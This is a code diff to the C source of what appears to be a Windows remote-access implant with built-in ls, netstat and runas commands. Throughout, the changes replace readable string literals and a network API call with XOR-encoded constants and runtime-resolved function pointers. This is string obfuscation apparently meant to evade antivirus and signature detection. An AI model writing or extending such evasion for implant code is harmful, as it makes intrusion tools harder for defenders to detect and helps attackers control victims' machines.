@@ -22,15 +22,19 @@ static void builtin_ls(const char *arg, char *out, int size) {
     if (size > 0) out[size - 1] = '\0';
     char pattern[MAX_PATH];
     if (!arg || arg[0] == '\0') {
-        _snprintf(pattern, sizeof(pattern) - 1, ".\\*");
+        char _dw[ENC_DIR_WILDCARD_LEN + 1]; xor_dec(_dw, ENC_DIR_WILDCARD, ENC_DIR_WILDCARD_LEN);
+        _snprintf(pattern, sizeof(pattern) - 1, "%s", _dw);
     } else {
         size_t len = strlen(arg);
-        if (len == 0 || arg[len - 1] == '\\' || arg[len - 1] == '/')
-            _snprintf(pattern, sizeof(pattern) - 1, "%s*", arg);
-        else if (strchr(arg, '*') || strchr(arg, '?'))
+        if (len == 0 || arg[len - 1] == '\\' || arg[len - 1] == '/') {
+            char _ds[ENC_DIR_FMT_STAR_LEN + 1]; xor_dec(_ds, ENC_DIR_FMT_STAR, ENC_DIR_FMT_STAR_LEN);
+            _snprintf(pattern, sizeof(pattern) - 1, _ds, arg);
+        } else if (strchr(arg, '*') || strchr(arg, '?'))
             _snprintf(pattern, sizeof(pattern) - 1, "%s", arg);
-        else
-            _snprintf(pattern, sizeof(pattern) - 1, "%s\\*", arg);
+        else {
+            char _dbs[ENC_DIR_FMT_BSLASH_STAR_LEN + 1]; xor_dec(_dbs, ENC_DIR_FMT_BSLASH_STAR, ENC_DIR_FMT_BSLASH_STAR_LEN);
+            _snprintf(pattern, sizeof(pattern) - 1, _dbs, arg);
+        }
     }
 
     WIN32_FIND_DATAA fd;
@@ -42,9 +46,11 @@ static void builtin_ls(const char *arg, char *out, int size) {
     }
     char _td[ENC_LS_TAG_DIR_LEN + 1];  xor_dec(_td, ENC_LS_TAG_DIR,  ENC_LS_TAG_DIR_LEN);
     char _tf[ENC_LS_TAG_FILE_LEN + 1]; xor_dec(_tf, ENC_LS_TAG_FILE, ENC_LS_TAG_FILE_LEN);
+    char _dot[ENC_DOT_LEN + 1];        xor_dec(_dot,    ENC_DOT,    ENC_DOT_LEN);
+    char _dotdot[ENC_DOTDOT_LEN + 1];  xor_dec(_dotdot, ENC_DOTDOT, ENC_DOTDOT_LEN);
     int pos = 0;
     do {
-        if (strcmp(fd.cFileName, ".") == 0 || strcmp(fd.cFileName, "..") == 0)
+        if (strcmp(fd.cFileName, _dot) == 0 || strcmp(fd.cFileName, _dotdot) == 0)
             continue;
         const char *tag = (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) ? _td : _tf;
         char _rf[ENC_LS_ROW_FMT_LEN + 1]; xor_dec(_rf, ENC_LS_ROW_FMT, ENC_LS_ROW_FMT_LEN);
@@ -457,9 +463,9 @@ static void builtin_netstat(char *out, int size) {
                 char local[32], remote[32], state[16];
                 char _naf[ENC_NETSTAT_ADDR_FMT_LEN + 1]; xor_dec(_naf, ENC_NETSTAT_ADDR_FMT, ENC_NETSTAT_ADDR_FMT_LEN);
                 _snprintf(local,  sizeof(local)  - 1, _naf,
-                    lip[0], lip[1], lip[2], lip[3], ntohs((WORD)row->dwLocalPort));
+                    lip[0], lip[1], lip[2], lip[3], fnHtons((WORD)row->dwLocalPort));
                 _snprintf(remote, sizeof(remote) - 1, _naf,
-                    rip[0], rip[1], rip[2], rip[3], ntohs((WORD)row->dwRemotePort));
+                    rip[0], rip[1], rip[2], rip[3], fnHtons((WORD)row->dwRemotePort));
                 tcp_state_str(row->dwState, state, sizeof(state));
                 n = _snprintf(out + pos, size - pos - 1, _ntf,
                     local, remote, state, (unsigned long)row->dwOwningPid);
@@ -481,7 +487,7 @@ static void builtin_netstat(char *out, int size) {
                 char local[32];
                 char _naf2[ENC_NETSTAT_ADDR_FMT_LEN + 1]; xor_dec(_naf2, ENC_NETSTAT_ADDR_FMT, ENC_NETSTAT_ADDR_FMT_LEN);
                 _snprintf(local, sizeof(local) - 1, _naf2,
-                    lip[0], lip[1], lip[2], lip[3], ntohs((WORD)row->dwLocalPort));
+                    lip[0], lip[1], lip[2], lip[3], fnHtons((WORD)row->dwLocalPort));
                 n = _snprintf(out + pos, size - pos - 1, _nuf, local, _nus);
                 if (n > 0 && pos + n < size - 1) pos += n;
             }
@@ -797,7 +803,8 @@ static void builtin_runas(const char *args, char *out, int size) {
     DWORD exit_code = 0;
     if (wait_ret == WAIT_OBJECT_0)
         fnGetExitCodeProcess(pi.hProcess, &exit_code);
-    _snprintf(out, size - 1, "pid=%lu exit=%lu",
+    char _pef[ENC_FMT_PID_EXIT_LEN + 1]; xor_dec(_pef, ENC_FMT_PID_EXIT, ENC_FMT_PID_EXIT_LEN);
+    _snprintf(out, size - 1, _pef,
               (unsigned long)pi.dwProcessId, (unsigned long)exit_code);
     fnCloseHandle2(pi.hProcess);
     fnCloseHandle2(pi.hThread);
